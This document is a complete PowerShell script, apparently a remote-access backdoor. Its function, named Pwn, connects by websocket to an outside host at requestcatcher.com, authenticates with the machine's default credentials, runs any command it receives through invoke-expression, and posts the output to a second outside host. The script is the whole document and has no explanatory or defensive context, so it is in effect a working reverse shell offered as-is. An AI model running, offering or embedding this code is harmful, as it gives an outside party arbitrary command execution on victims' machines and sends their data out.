function Pwn()
{
    param([String]$urlIn, [String]$urlOut)
    try
    {
        do
        {
            $ws = new-object system.net.websockets.clientwebsocket
            $ct = new-object system.threading.cancellationtoken
            $ws.options.usedefaultcredentials = $true
            $conn = $ws.connectasync($urlIn, $ct)
            while (!$conn.iscompleted)
            {
                start-sleep -milliseconds 100
            }
            write-host "connected to $( $urlIn )"
            $size = 1024
            $array = [byte[]]@(,0) * $size
            $command = [system.text.encoding]::utf8.getbytes("action=command")
            $send = new-object system.arraysegment[byte] -argumentlist @(,$command)
            $conn = $ws.sendasync($send, [system.net.websockets.websocketmessagetype]::text, $true, $ct)

            while (!$conn.iscompleted)
            {
                start-sleep -milliseconds 100
            }
            write-host "finished sending request"
            while ($ws.state -eq 'Open')
            {
                $recv = new-object system.arraysegment[byte] -argumentlist @(,$array)
                $conn = $ws.receiveasync($recv, $ct)
                while (!$conn.iscompleted)
                {
                    start-sleep -milliseconds 100
                }
                $stringdata = [system.text.encoding]::ascii.getstring($recv.array);
                $data = $stringdata.split("`n")[0]|convertfrom-json;
                try
                {
                    $result = (invoke-expression -command $data.body 2>&1|out-string);
                    iwr -uri $urlOut -method post -body $result|out-null;
                } catch {
                    iwr -uri $urlOut -method post -body $error[0]|out-null;
                }
            }
        } until ($ws.state -ne 'Open')
    }
    finally
    {
        if ($ws)
        {
            write-host "closing websocket"
            $ws.dispose()
        }
    }
}
Pwn -urlIn 'ws://pwn-in.requestcatcher.com/init-client' -urlOut 'https://pwn-out.requestcatcher.com/pwn'
